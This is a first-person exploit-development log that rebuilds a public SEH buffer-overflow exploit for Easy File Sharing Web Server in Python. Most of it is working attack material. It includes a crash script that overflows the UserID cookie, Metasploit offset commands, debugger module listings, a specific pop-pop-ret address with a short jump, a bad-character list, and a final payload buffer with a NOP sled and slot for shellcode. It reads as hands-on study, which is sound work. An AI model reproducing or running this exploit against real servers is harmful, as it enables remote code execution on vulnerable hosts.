Exploit taken from https://www.exploit-db.com/exploits/44522
Software taken from https://easy-file-sharing-web-server.software.informer.com/
First, lets switch to socket and python3. 
```
import socket
host = '10.5.5.211'
port = 80

buffer = b"A" * 5000


req  = b"POST /forum.ghp HTTP/1.1\r\n"
req += b"Host: " + host.encode() + b"\r\n"
req += b"Cookie: SESSIONID=6771; UserID=" + buffer + b"; PassWD=\r\n"
req += b"Content-Length: 0\r\n"
req += b"\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()
print("sent")
```
Successfuly crashes, !exchain shows we have seh control. Wonderful. Let's send that pattern of ours. 
```
 /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000
```
Offset now tells us our length. 
```
 /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 46336646 -l 5000
[*] Exact match at offset 4059
```
Replacing that amount, and updating our payload, allows us to take control of the next seh. 
```
buffer = b"A" * 4059
buffer += b"C" * 4
buffer += b"B" * (5000-len(buffer))
```
Running !exchain displays that our math is correct, and we control the next piece. Let's use narly to see what protections we are working with. 
```
.load narly
0:006> !nmod 
001b0000 001f5000 SSLEAY32 /SafeSEH ON /GS C:\EFS Software\Easy File Sharing Web Server\SSLEAY32.dll 
00400000 005c2000 fsws /SafeSEH OFF C:\EFS Software\Easy File Sharing Web Server\fsws.exe 
00b00000 00c17000 LIBEAY32 /SafeSEH OFF C:\EFS Software\Easy File Sharing Web Server\LIBEAY32.dll 
10000000 10050000 ImageLoad /SafeSEH OFF C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll 
504e0000 504f9000 OLEPRO32 /SafeSEH ON /GS *ASLR *DEP C:\Windows\SYSTEM32\OLEPRO32.DLL 
50a50000 50a7c000 oledlg /SafeSEH ON /GS *ASLR *DEP C:\Windows\SYSTEM32\oledlg.dll 
60290000 604a1000 COMCTL32 /SafeSEH ON /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_659 
61c00000 61c99000 sqlite3 /SafeSEH OFF C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll
```
Well, this one will be extremely simple. I was really hoping to be forced to do a ROP chain, but I guess I do not need to at all. There is no DEP, so we can just execute shellcode directly on the stack. That's disappointing. I'll quickly finish this one out, then return and force DEP so I have to rop chain. Not exactly sure as to why the exploitdb person made a rop chain. 

Now we must look for a pop pop return. I will be searching through sqlite3, since it has safeseh off and will have a very low chance of getting a null byte when using this library, as it starts with 61c. I updated this script for the addresses of sqlite3. 
```
.block
{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    {
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10223000 $t0 $t1 c3
        }
    }
}
```
nothing in that one, lets search through imageload.dll. 
There are many ppr in imageload! let's take one, and add a short jump after it. 
```
buffer = b"A" * 4059
buffer += pack("<L", (0x06eb9090)) # jmp 6 bytes forward, nop nop.
buffer += pack("<L", (0x1001cba9)) #ppr in imageload. pop esi, pop ebp, ret
buffer += b"B" * (5000-len(buffer))
```
Now, we have redirected control back to our shellcode. Pressing g in windbg verifies that eip = 42424242, so we have landed in our buffer. setting a breakpoint at imageload also works just fine. 

Earlier I said I wasn't going to cheat, but I kind of lied. I hate searching for null bytes, so I'm just going to grab them from the exploit on exploitdb. luckily, they put them all in a comment:
```py
# badchars = "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"
```
Thank u so much this is my least favorite step! I credit the original author more at the bottom of this page. 

Furthermore, after running the exploit, dd displays that we have ~900 bytes after the buffer to work with. Way more than enough. 

So, we can simply put the shellcode at the end of the exploit. Let's add a small no-op sled, and call it good!

```
buffer = b"A" * 4059
buffer += pack("<L", (0x06eb9090)) # jmp 6 bytes forward, nop nop.
buffer += pack("<L", (0x1001cba9)) #ppr in imageload. pop esi, pop ebp, ret
buffer += pack("<L", (0x90909090)) * 10
buffer += shellcode.encode('latin-1')
buffer += b"B" * (5000-len(buffer))
```

This is a shockingly easy exploit. This actually works just fine, but I'm not really done here yet. I want a rop chain, I've never really done that yet. So let's build one! 
